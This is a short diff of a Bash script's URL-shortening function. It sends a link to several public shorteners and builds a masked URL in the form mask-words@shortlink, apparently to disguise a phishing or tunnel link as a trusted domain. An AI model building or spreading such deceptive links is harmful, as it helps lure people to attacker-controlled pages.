@@ -87,14 +87,14 @@ links() {
 function url_shortner() {
         rm -rf uri.log
 	#short=$(curl -s http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${ngrok_url})
-	#short=$(curl -s https://vurl.com/api.php?url=${ngrok_url})
-	derek=$(curl -s https://is.gd/create.php\?format\=simple\&url=${link})
+	derek=$(curl -s https://vurl.com/api.php?url=${clink})
+	#short=$(curl -s https://is.gd/create.php\?format\=simple\&url=${clink})
         #checking for is.gd is working or not.
         if [[ $derek == https://is.gd/[-0-9a-zA-Z]* ]]; then
         shorter=${derek#https://}
         else
-        #short=$(curl -s https://soo.gd/api.php?url=${link})
-        curl -s https://api.shrtco.de/v2/shorten?url=${link} >> log.URI 
+        #short=$(curl -s https://soo.gd/api.php?url=${clink})
+        curl -s https://api.shrtco.de/v2/shorten?url=${clink} >> log.URI 
         grep -o 'https:[^"]*' log.URI >> bURI
         rm log.URI
         sed 's/\\//g' bURI >> cld.log
@@ -110,6 +110,8 @@ function url_shortner() {
         final_url=$mask-$words@$shorter
 	printf "$final_url\n"
 }
+
+
 # ASK FOR URL MODIFICATION
 function askuri() {
 echo ""
